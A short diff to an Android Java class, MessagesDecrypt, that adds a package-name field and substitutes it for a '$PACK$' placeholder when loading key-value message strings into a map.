@@ -26,7 +26,8 @@ public class MessagesDecrypt {
 
 	final HashMap<String, String> messages = new HashMap<String, String>();
 
-
+	String pack = Status.self().getAppContext().getPackageName();
+	
 	public MessagesDecrypt(Context context) {
 
 		if (Cfg.DEBUG) {
@@ -73,8 +74,9 @@ public class MessagesDecrypt {
 					Check.asserts(kv.length == 2, "wrong number of tokens"); //$NON-NLS-1$
 					//Check.log(TAG + " " + kv[0] + " " + kv[1]); //$NON-NLS-1$ //$NON-NLS-2$
 				}
-
-				messages.put(kv[0], kv[1]);
+				
+				String value = kv[1].replace("$PACK$", pack);
+				messages.put(kv[0], value);
 
 				if (Cfg.DEBUG) {
 					Check.asserts(messages.containsKey(kv[0]), "strange hashmap behaviour"); //$NON-NLS-1$
